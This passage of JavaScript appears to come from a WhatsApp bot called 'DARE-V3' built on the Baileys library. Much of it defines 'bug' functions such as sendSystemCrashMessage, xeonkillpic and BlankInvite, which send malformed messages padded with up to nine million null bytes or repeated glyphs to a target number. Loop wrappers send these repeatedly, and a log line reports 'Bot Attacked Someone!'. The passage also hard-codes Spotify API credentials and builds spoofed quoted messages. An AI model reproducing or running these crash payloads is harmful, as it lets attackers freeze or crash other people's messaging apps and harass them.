"/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6281991410940@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "Hello ",
								"body": " 🌷 𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈 Is Here ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": " p ",
								"mediaUrl": " p ",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": " p "
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				ptcp ? {
					participant: {
						jid: zLoc,
					}
				} : {}
			);
			console.log(chalk.green("𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈 Bot Attacked Someone!"));
		};
		
// Blank Speciality //
async function BlankInvite(LockJids, ptcp = false) {
			var messageContent = generateWAMessageFromContent(LockJids, proto.Message.fromObject({
				'viewOnceMessage': {
					'message': {
						"newsletterAdminInviteMessage": {
							"newsletterJid": `120363298524333143@newsletter`,
							"newsletterName": "z𝐃𝐀𝐑𝐄-𝐕𝟑⃟⃟⃟😈" + "\u0000".repeat(50000),
							"jpegThumbnail": "",
							"caption": 'ꦾ'.repeat(30000),
							"inviteExpiration": Date.now() + 1600
						}
					}
				}
			}), {
				'userJid': LockJids
			});
			await Dare.relayMessage(LockJids, messageContent.message, {
				'participant': {
					'jid': LockJids
				},
				'messageId': messageContent.key.id
			});
		}
			
let example = (teks) => {
return `\n*Example Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}
async function loading1 () {
var baralod = [
"*𝐃𝐀𝐑𝐄-𝐕𝟑_*",
"*_𝑩Y 𝐁.𝐌.𝐁 ><_*",
"*_PLEASE WAIT●_*", 
"*_LOADING COMPLETED_*",
"*_SUCESS FULL_*", 
]
let { key } = await Dare.sendMessage(from, {text: '𝐃𝐀𝐑𝐄-𝐕𝟑'})

for (let i = 0; i < baralod.length; i++) {
await Dare.sendMessage(from, {text: baralod[i], edit: key });
}
}                                       
                                                                                                                                                                                                          //END BUGS
//bug functions
//end bug functions
//old bug functions
const force = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./data/image/thumb.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"NGN\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🙂드림 가이 OPAY 🙂드림 가이 OPAY 🙂드림 가이 OPAY\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./data/image/thumb.jpg`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"NGN\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🙂드림 가이 Nano 🙂드림 가이 Nano 🙂드림 가이 Nano\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickxeon = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `🙂드림 가이 OPAY`
}
}
}
async function nanoainew(text) {
try {
const ainya = await fetchJson(`https://widipe.com/ai/c-ai?promt=You are not 𝐁𝐌𝐁 🙂 , SUPPORT &text=${encodeURIComponent(text)}`)
const hangsul = ainya.result
    reply(`${hangsul}`)
  } catch (error) {
    reply(`${error}`)
  }
}
async function blackening(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await Dare.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function locationxeony(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `🙂드림 가이 OPAY 🙂드림 가이 OPAY 🙂드림 가이 OPAY`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await Dare.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function xeonkillpic(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "🙂드림 가이 Nano",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://files.catbox.moe/7rt6v2.jpg" } }, { upload: Dare.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #🙂드림 가이 Nano"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await Dare.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function aipong(target) {
await Dare.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}

async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "🙂드림 가이 Nano"+" ".repeat(1000000),
        'footerText': `🙂드림 가이 Nano 🙂드림 가이 Nano 🙂드림 가이 Nano`,
        'description': `🙂드림 가이 Nano 🙂드림 가이 Nano 🙂드림 가이 Nano`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: oneclickxeon });
await Dare.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
const sendReaction = async reactionContent => {
  Dare.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

async function sendRepeatedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
   Dare.sendMessage(recipientJid, {
      'text': ''.repeat(1000000)
    }, {
      'participant': {
        'jid': jid
      },
      'messageId': etc.key.id
    }, {
      'quoted': m
    });
  }
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(1000000)
            })
          })
        }
      }
    }, {});
    Dare.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}

async function sendSystemCrashMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ display_text : 'SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸', url : , merchant_url :  }"
            }],
            'messageParamsJson': "\0".repeat(9000000)
          }
        }
      }
    }
  }), {
    'userJid': jid
  });
  await Dare.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}
async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(1000000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 900000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await Dare.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(900000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await Dare.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendExtendedTextMessage(jid) {
  Dare.relayMessage(jid, {
    'extendedTextMessage': {
      'text': '.',
      'contextInfo': {
        'stanzaId': jid,
        'participant': jid,
        'quotedMessage': {
          'conversation': 'Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½' + 'ê¦¾'.repeat(900000)
        },
        'disappearingMode': {
          'initiator': "CHANGED_IN_CHAT",
          'trigger': "CHAT_SETTING"
        }
      },
      'inviteLinkGroupTypeV2': "DEFAULT"
    }
  }, {
    'participant': {
      'jid': jid
    }
  }, {
    'messageId': null
  });
}
async function sendPaymentInvite(jid) {
  Dare.relayMessage(jid, {
    'paymentInviteMessage': {
      'serviceType': "UPI",
      'expiryTimestamp': Date.now() + 864100000
    }
  }, {
    'participant': {
      'jid': jid
    }
  });
}

async function sendMultiplePaymentInvites(jid, count) {
  for (let i = 0; i < count; i++) {
    sendPaymentInvite(jid);
    sendExtendedTextMessage(jid);
    await sleep(500);
  }
}

async function sendVariousMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendListMessage(jid);
    sendLiveLocationMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessages2(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendRepeatedMessagesdansya(jid, count) {
  for (let i = 0; i < count; i++) {
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    sendSystemCrashMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

async function sendMixedMessagesdansya(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return Dare.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return Dare.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
Dare.sendImageAsSticker = async (jid, media, m, options = {}) => {
    let { Sticker, StickerTypes } = require('wa-sticker-formatter')
    const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
    let jancok = new Sticker(media, {
        pack: global.packname, // The pack name
        author: global.author, // The author name
        type: StickerTypes.FULL, // The sticker type
        categories: ['🤩', '🎉'], // The sticker category
        id: '12345', // The sticker id
        quality: 50, // The quality of the output file
        background: '#FFFFFF00' // The sticker background color (only for full stickers)
    })
    let stok = getRandom(".webp")
    let nono = await jancok.toFile(stok)
    let nah = fs.readFileSync(nono)
    await Dare.sendMessage(jid,{sticker: nah},{quoted: m})
    return await fs.unlinkSync(stok)
     }

const sendvn = (teks) => {
Dare.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
async function getAccessToken() {
    try {
        const client_id = 'acc6302297e040aeb6e4ac1fbdfd62c3';
        const client_secret = '0e8439a1280a43aba9a5bc0a16f3f009';
        const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");
        const response = await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
            headers: {
                Authorization: `Basic ${basic}`,
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });
        const data = response.data;
        return data.access_token;
    } catch (error) {
        console.error('Error getting Spotify access token:', error);
        throw 'An error occurred while obtaining Spotify access token.';
    }
}
async function spotifydl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      const kemii = await axios.get(
        `https://api.fabdl.com/spotify/get?url=${encodeURIComponent(url)}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const kemi = await axios.get(
        `https://api.fabdl.com/spotify/mp3-convert-task/${kemii.data.result.gid}/${kemii.data.result.id}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const result = {};
      result.title = kemii.data.result.name;
      result.type = kemii.data.result.type;
      result.artis = kemii.data.result.artists;
      result.durasi = kemii.data.result.duration_ms;
      result.image = kemii.data.result.image;
      result.download = "https://api.fabdl.com" + kemi.data.result.download_url;
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
};

async function searchSpotify(query) {
    try {
        const access_token = await getAccessToken();
        const response = await axios.get(`https://api.spotify.com/v1/search?q=${query}&type=track&limit=10`, {
            headers: {
                Authorization: `Bearer ${access_token}`,
            },
        });
        const data = response.data;
        const tracks = data.tracks.items.map(item => ({
            name: item.name,
            artists: item.artists.map(artist => artist.name).join(', '),
            popularity: item.popularity,
            link: item.external_urls.spotify,
            image: item.album.images[0].url,
            duration_ms: item.duration_ms,
        }));
        return tracks;
    } catch (error) {
        console.error('Error searching Spotify:', error);
        throw 'An error occurred while searching for songs on Spotify.';
    }
}
async function NanoHDvideo() {
  try {
    const inputVideo = await Dare.downloadAndSaveMediaMessage(quoted);
    const outputVideo = 'output_2k.mp4';
    await new Promise((resolve, reject) => {
      ffmpeg(inputVideo)
        .outputOptions('-vf', 'scale=2560:1440')
        .on('start', commandLine => {
          console.log('Start the process with the command:', commandLine);
        })
        .on('progress', progress => {
          console.log('Proses sedang berjalan:', progress.percent.toFixed(2) + '% selesai');
        })
        .on('end', () => {
          console.log('Proses selesai!');
          resolve();
        })
        .on('error', (err, stdout, stderr) => {
          console.error('There is an error:', err.message);
          console.error('stdout:', stdout);
          console.error('stderr:', stderr);
          reject(err);
        })
        .save(outputVideo);
    });
    const caption = 'Successfully made the video HD';
    await Dare.sendMessage(m.chat, { caption: caption, video: { url: path.resolve(outputVideo) } }, { quoted: m });

  } catch (error) {
   reply('There is an error:', error);
  }
}
//autoreply
for (let BhosdikaXeon of NanoVoiceNote) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./data/assets/audio/${BhosdikaXeon}.mp3`)
Dare.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of NanoSticker){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./data/NanoMedia/sticker/${BhosdikaXeon}.webp`)
Dare.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageNano){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./data/NanoMedia/image/${BhosdikaXeon}.jpg`)
Dare.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoNano){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./data/NanoMedia/video/${BhosdikaXeon}.mp4`)
Dare.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}
Dare.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message
}
}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await Dare.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
return waMessage
}


const lep = {
key: {
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }
//Fake
